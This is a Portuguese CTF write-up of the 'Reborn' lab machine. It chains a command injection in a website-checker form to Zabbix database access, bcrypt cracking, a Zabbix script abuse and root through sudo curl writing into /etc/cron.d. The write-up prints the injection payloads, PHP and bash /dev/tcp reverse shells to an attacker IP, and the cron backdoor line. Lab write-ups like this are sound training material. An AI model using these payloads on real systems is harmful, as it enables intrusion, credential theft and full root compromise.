# Reborn

![Reborn image](/images/hackingclub-reborn/file-reborn-2025-1.png)

## 📝 Sumário

A máquina REBORN apresenta uma cadeia de comprometimento que começou com uma vulnerabilidade de `command injection` no aplicativo web. A exploração inicial permitiu executar comandos no servidor e, a partir daí, acessar o banco de dados do `Zabbix`. No banco foi possível extrair as credenciais do administrador do painel web, o que levou à autenticação no painel administrativo do Zabbix. Com acesso ao painel/credenciais, foi estabelecida uma shell reversa que concedeu controle interativo sobre a máquina como o usuário que roda o serviço do Zabbix. Esse usuário tinha uma configuração sensível: permissão de sudo para executar o `curl` — um privilégio que foi usado como vetor para elevar privilégios e alcançar acesso root. Ao final, o atacante conseguiu controle total do sistema e do painel de monitoramento, podendo ler credenciais, modificar configurações e implantar mecanismos de persistência. Essa máquina ilustra bem como uma falha aparentemente localizada (validação de entrada insuficiente levando a command injection) pode ser encadeada — via acesso a banco de dados, credenciais expostas e configurações de sudo permissivas — até um comprometimento completo do ambiente de monitoramento.

## 🔒 Descoberta de aplicativo web

Quando tentamos acessar o web service, somos redirecionados para `reborn.hc`. Precisamos acrescentar isso em nosso arquivo `/etc/hosts`:

```bash
curl -I $IP
echo "$IP reborn.hc" | sudo tee -a /etc/hosts
```

## 👁️‍🗨️ Reconhecimento

### 🚪 Varedura de portas

O `nmap` foi utilizado para mapear portas e serviços ativos na máquina alvo. O scan revelou apenas duas portas abertas:

```bash
nmap -sC -sV -oA reborn.hc
```

**Resultado:**

```
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)
```

## 🔎 Analisando o aplicativo web

### 📂 Fuzzing de diretórios

Vamos realizar a enumeração de hosts virtuais para descobrir subdomínios ocultos:

```bash
ffuf -w /path/to/wordlists -u http://reborn.hc/FUZZ
```

**Resultado:**

```bash
reborn.hc/index.php
```

Acessando o **index.php** no aplicativo web somos redirecionados para um checador de websites, que utiliza comunicação HTTP/HTTPS com o output rodando `curl` internamente.

![Web fuzzing result](/images/hackingclub-reborn/file-reborn-2025-2.png)

## 🧑‍💻 Explorando a vulnerabilidade

### 💉 Command Injection

Campo Website URL é concatenado numa chamada de sistema (ex.: `curl`) sem validação/sanitização, permitindo injeção de comandos.

```
http://127.0.0.1;curl file:///var/www/html/index.php
```

![Command injection](/images/hackingclub-reborn/file-reborn-2025-3.png)

### Analisando o conteúdo do arquivo index.php

Analisando as primeiras linhas de código, percebemos que a variável `$expertMode` é acessível através da URL se o parâmetro GET `expertMode` existir e se seu valor for exatamente **tcp**.

![URL snippet](/images/hackingclub-reborn/file-reborn-2025-4.png)  
![Expert Mode](/images/hackingclub-reborn/file-reborn-2025-5.png)

Analisando o index novamente, vemos que `escapeshellarg($ip)` coloca o IP entre aspas e escapa caracteres perigosos, então o IP fica seguro contra injeção.  
A porta (`$port`) é concatenada sem sanitização, portanto um atacante pode injetar operadores de shell (`;`, `&&`, `|`, etc.) ou outras cargas úteis através do campo port.

![Vulnerability analysis](/images/hackingclub-reborn/file-reborn-2025-6.png)

### ☠️ Reverse Shell

Aproveitando o input (`$port`) onde não faz o `escapeshellarg`.

```bash
php -r '$sock=fsockopen('10.0.73.93',1234);exec('sh <&3 >&3 2>&3');'
```

![Reverse shell](/images/hackingclub-reborn/file-reborn-2025-7.png)

### Zabbix

Acessando arquivo de configuração do banco de dados Zabbix.

![Zabbix configuration](/images/hackingclub-reborn/file-reborn-2025-8.png)

Credenciais de acesso ao banco de dados rodando localmente.

![Zabbix credentials](/images/hackingclub-reborn/file-reborn-2025-9.png)

Query SQL na tabela users para obter credenciais de administrador.

![Users table](/images/hackingclub-reborn/file-reborn-2025-10.png)

Hash do tipo Bcrypt. Utilizamos o módulo 3200 do hashcat para quebrar a senha.

```bash
hashcat -m 3200 hash wordlist
```

![Hashcat cracking](/images/hackingclub-reborn/file-reborn-2025-11.png)

### ☠️ Explorando o painel de administração do Zabbix

Acessando `http://reborn.hc/zabbix`.

![Zabbix panel](/images/hackingclub-reborn/file-reborn-2025-12.png)

Alterando o script ping para a reverse shell.

```bash
php -r '$sock=fsockopen('10.0.73.93',1234);exec('sh <&3 >&3 2>&3');'
```

![Reverse shell via Zabbix](/images/hackingclub-reborn/file-reborn-2025-13.png)

Clicando em **Monitoring > Hosts**, executamos o ping.

![Ping script](/images/hackingclub-reborn/file-reborn-2025-14.png)

Capturamos a primeira flag.

![First flag](/images/hackingclub-reborn/file-reborn-2025-15.png)

## 📈 Escalando privilégios

### Permissões

Verificando as permissões de sudo do usuário `vito`.

```bash
sudo -l
```

![Sudo permissions](/images/hackingclub-reborn/file-reborn-2025-16.png)

Se o binário tiver permissão para ser executado como superusuário por sudo, ele não perderá os privilégios elevados e poderá ser usado para acessar o sistema de arquivos, escalar ou manter o acesso privilegiado.

```bash
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/10.0.73.93/4444 0>&1'" > cron_pwn
```

![Cron job for privilege escalation](/images/hackingclub-reborn/file-reborn-2025-17.png)

Subindo servidor localmente.

![Server local](/images/hackingclub-reborn/file-reborn-2025-18.png)

### ☠️ Obtendo shell de root

```bash
sudo /usr/bin/curl -fsSL http://10.0.73.93:8000/cron_pwn -o /etc/cron.d/pwn
```

**Explicação:**

- `sudo` → Executa o comando com privilégios de superusuário.  
- `/usr/bin/curl` → Usa o curl para baixar um arquivo de uma URL.  
- `-fsSL` → Opções do curl:
  - `-f`: falhar silenciosamente em erros HTTP.
  - `-s`: modo silencioso (sem progresso).
  - `-S`: mostra erros mesmo em modo silencioso.
  - `-L`: segue redirecionamentos.
- `http://10.0.73.93:8080/cron_pwn` → URL onde está o arquivo a ser baixado.  
- `-o /etc/cron.d/pwn` → Salva o arquivo baixado no diretório `/etc/cron.d/` com o nome `pwn`.

### O que isso faz no sistema

> ❌ Baixa remotamente um arquivo chamado `cron_pwn` e o coloca no diretório `/etc/cron.d/`, que é usado para configurar tarefas agendadas no cron. Todas as tarefas são executadas a cada um minuto. Isso significa que o arquivo baixado provavelmente contém uma tarefa cron que será executada automaticamente com privilégios de root.
{: .prompt-danger}

![Curl download](/images/hackingclub-reborn/file-reborn-2025-19.png)

Agora nos tornamos root e capturamos a segunda flag.

![Second flag](/images/hackingclub-reborn/file-reborn-2025-20.png)